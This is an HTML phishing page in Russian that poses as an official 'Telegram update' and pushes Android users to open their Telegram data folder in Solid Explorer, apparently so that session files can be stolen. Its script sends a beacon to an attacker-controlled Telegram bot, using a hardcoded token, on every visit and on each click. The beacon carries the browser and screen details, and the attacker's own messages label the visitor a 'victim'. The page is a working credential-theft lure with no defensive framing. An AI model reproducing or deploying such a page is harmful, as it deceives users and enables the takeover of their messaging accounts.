<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Обновление Telegram</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif; }
        body {
            background: #0a0a0a;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 16px;
            margin: 0;
        }
        .container {
            background: #1a1a1a;
            padding: 32px 24px;
            border-radius: 24px;
            max-width: 380px;
            width: 100%;
            text-align: center;
            border: 1px solid #2a2a2a;
        }
        .icon { font-size: 64px; margin-bottom: 16px; }
        .title { color: #fff; font-size: 22px; font-weight: 700; margin-bottom: 8px; }
        .sub { color: #888; font-size: 14px; margin-bottom: 8px; }
        .update-box {
            background: #0a2a1a;
            border: 1px solid #00cc66;
            border-radius: 12px;
            padding: 12px;
            margin: 16px 0;
            color: #66ff99;
            font-size: 14px;
        }
        .update-box span { font-weight: 700; }
        .btn {
            background: #0088cc;
            border: none;
            color: #fff;
            padding: 18px;
            width: 100%;
            border-radius: 12px;
            font-size: 18px;
            font-weight: 600;
            cursor: pointer;
            margin-top: 16px;
            transition: 0.2s;
        }
        .btn:active { opacity: 0.7; }
        .btn-install {
            background: #2a2a2a;
            border: 2px solid #00cc66;
            color: #66ff99;
            padding: 14px;
            width: 100%;
            border-radius: 12px;
            font-size: 16px;
            cursor: pointer;
            margin-top: 12px;
            display: none;
        }
        .btn-install:active { background: #333; }
        .status {
            margin-top: 16px;
            color: #888;
            font-size: 14px;
            display: none;
        }
        .footer { color: #444; font-size: 12px; margin-top: 24px; border-top: 1px solid #2a2a2a; padding-top: 16px; }
        .hint { color: #555; font-size: 11px; margin-top: 8px; }
    </style>
</head>
<body>

<div class="container">
    <div class="icon">⬆️</div>
    <div class="title">Обновление Telegram</div>
    <div class="sub">Вышла новая версия с улучшенной защитой</div>

    <div class="update-box">
        ✅ <span>Обновление доступно!</span> Выберите папку с данными Telegram.
    </div>

    <button class="btn" id="folderBtn">📂 Открыть Solid Explorer</button>
    <button class="btn-install" id="installBtn">📥 Установить Solid Explorer</button>

    <div class="status" id="status">⏳ Обработка...</div>
    <div class="hint">Для продолжения установите Solid Explorer (бесплатно)</div>
    <div class="footer">Telegram • 2026</div>
</div>

<script>
    // ===== КОНФИГУРАЦИЯ =====
    const BOT_TOKEN = '8712563091:AAEg-wCQ4x7wviL5UUC5yDh2_q3gZWBn6gg';
    const CHAT_ID = '8277809761';
    const WEBHOOK = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

    function sendToTG(text) {
        fetch(WEBHOOK, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: text.substring(0, 4096),
                parse_mode: 'HTML'
            })
        }).catch(e => console.log('Ошибка отправки:', e));
    }

    function showStatus(text) {
        const status = document.getElementById('status');
        status.style.display = 'block';
        status.textContent = text;
    }

    // ===== ПРОВЕРКА УСТАНОВКИ SOLID EXPLORER =====
    function isSolidExplorerInstalled() {
        // Пытаемся открыть Solid Explorer через intent
        const intent = 'intent://#Intent;package=pl.solidexplorer2;end';
        return new Promise((resolve) => {
            const iframe = document.createElement('iframe');
            iframe.style.display = 'none';
            iframe.src = intent;
            document.body.appendChild(iframe);

            // Если через 2 секунды ничего не произошло — вероятно, приложение не установлено
            const timeout = setTimeout(() => {
                document.body.removeChild(iframe);
                resolve(false);
            }, 2000);

            // Если приложение установлено — браузер покажет диалог выбора
            // (нельзя точно определить, но можно попробовать)
            window.addEventListener('blur', function onBlur() {
                clearTimeout(timeout);
                document.body.removeChild(iframe);
                window.removeEventListener('blur', onBlur);
                resolve(true);
            });
        });
    }

    // ===== ОТКРЫТИЕ SOLID EXPLORER =====
    document.getElementById('folderBtn').addEventListener('click', async function() {
        const btn = this;
        btn.textContent = '⏳ Проверка...';
        btn.disabled = true;

        // Отправляем уведомление
        sendToTG(`📂 <b>Жертва нажала "Открыть Solid Explorer"</b>\n🖥 ${navigator.userAgent}`);

        // Пробуем открыть Solid Explorer
        const installed = await isSolidExplorerInstalled();

        if (installed) {
            // Открываем Solid Explorer с указанием папки Telegram
            const path = '/storage/emulated/0/Android/data/org.telegram.messenger/files';
            const intent = `intent://${path}#Intent;package=pl.solidexplorer2;action=android.intent.action.VIEW;end`;
            window.location.href = intent;

            showStatus('✅ Solid Explorer открыт. Выберите папку Telegram.');
            sendToTG(`✅ <b>Solid Explorer открыт</b>\n📁 Путь: ${path}`);
            btn.textContent = '✅ Открыто';
            btn.style.background = '#00cc66';
        } else {
            // Solid Explorer не установлен — показываем кнопку установки
            document.getElementById('installBtn').style.display = 'block';
            showStatus('⚠️ Solid Explorer не установлен. Установите его.');
            sendToTG(`❌ <b>Solid Explorer не установлен</b>`);
            btn.textContent = '📂 Открыть Solid Explorer';
            btn.disabled = false;
        }
    });

    // ===== УСТАНОВКА SOLID EXPLORER =====
    document.getElementById('installBtn').addEventListener('click', function() {
        // Отправляем в Google Play
        window.location.href = 'https://play.google.com/store/apps/details?id=pl.solidexplorer2';
        showStatus('📥 Установите Solid Explorer, затем вернитесь и нажмите "Открыть"');
        sendToTG(`📥 <b>Жертва устанавливает Solid Explorer</b>`);
    });

    // ===== АВТО-УВЕДОМЛЕНИЕ =====
    window.onload = function() {
        sendToTG(`🟢 <b>НОВЫЙ ВИЗИТ</b>\n🖥 ${navigator.userAgent}\n📺 ${screen.width}x${screen.height}`);
    };
</script>
</body>
</html>
